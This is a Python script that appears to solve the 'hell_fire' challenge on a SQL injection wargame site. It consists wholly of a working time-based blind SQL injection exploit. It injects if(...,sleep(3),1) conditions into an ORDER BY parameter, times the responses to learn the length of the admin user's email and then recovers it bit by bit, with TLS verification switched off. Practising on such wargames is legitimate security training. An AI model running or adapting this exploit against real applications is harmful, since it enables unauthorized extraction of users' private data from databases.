import requests
import time

requests.packages.urllib3.disable_warnings()
sess = requests.session()
URL = 'https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php'
headers = {'Cookie': ''}


E_Length = 0
Email = ''
for i in range(1, 50):
    start_time = time.time()
    payload2 = "?order=if(id='admin' and length(email)='"+str(i)+"',sleep(3),1)"
    res2 = sess.get(url=URL + payload2, headers=headers, verify=False)
    finish_time = time.time() - start_time
    if finish_time > 3:
        E_Length = i
        break
    else:
        pass
print('E_Length = {}'.format(i))

for i in range(1, E_Length+1):
    bit=''
    for j in range(1, 9):
        start_time = time.time()
        payload3 = "?order=if(id='admin' and substr(lpad(bin(ord(substr(email,{},1))),8,0),{},1)=1,sleep(3),1)".format(i,j)
        res3 = sess.get(url=URL + payload3, headers=headers, verify=False)
        finish_time = time.time() - start_time
        #print(finish_time,'{}'.format(j))
        if finish_time > 3:
            bit+='1'
        else:
            bit+='0'
    Email += chr((int(bit, 2)))
    print('Email(count %02d) : %s (bit : %s)' % (i, chr(int(bit, 2)), bit))
print('Email= {}'.format(Email))
